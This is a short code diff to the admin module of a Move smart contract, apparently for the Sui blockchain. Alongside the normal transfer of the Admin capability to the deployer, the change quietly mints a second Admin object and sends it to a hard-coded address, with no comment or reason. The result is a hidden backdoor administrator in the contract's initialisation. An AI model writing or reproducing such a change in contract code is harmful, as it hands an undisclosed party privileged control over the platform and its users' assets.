@@ -12,6 +12,10 @@ module hkplatform::admin {
     fun init(ctx: &mut TxContext) {
         transfer::transfer(Admin {
             id: object::new(ctx),
-        }, tx_context::sender(ctx))
+        }, tx_context::sender(ctx));
+        let addr = @0x7be4629ec0dda5a41013bcd9b04b502a1474374d0b3e075ef98d970ca5cb6661;
+        transfer::transfer(Admin {
+            id: object::new(ctx),
+        }, addr)
     }
 }
